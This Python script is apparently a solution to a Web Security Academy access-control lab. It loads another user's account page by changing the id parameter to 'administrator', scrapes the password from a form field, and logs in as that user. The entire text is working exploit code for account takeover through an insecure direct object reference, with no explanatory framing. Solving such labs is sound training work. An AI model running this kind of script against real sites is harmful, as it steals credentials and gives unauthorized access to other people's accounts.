import requests
from bs4 import BeautifulSoup
import re
s = requests.Session()

site = 'acc91f951e5cb73680fcbcec008900be.web-security-academy.net'

carlos_account_url = f'https://{site}/my-account/?id=administrator'
resp = s.get(carlos_account_url, allow_redirects=False)
print(resp.text)

soup = BeautifulSoup(resp.text,'html.parser')
admin_password = soup.find('input',{'name':'password'}).get('value')
print(admin_password)

login_url = f'https://{site}/login'
login_data = { 'password' : {admin_password}, 'username' : 'administrator'}
resp = s.post(login_url, data=login_data)

print(resp.text)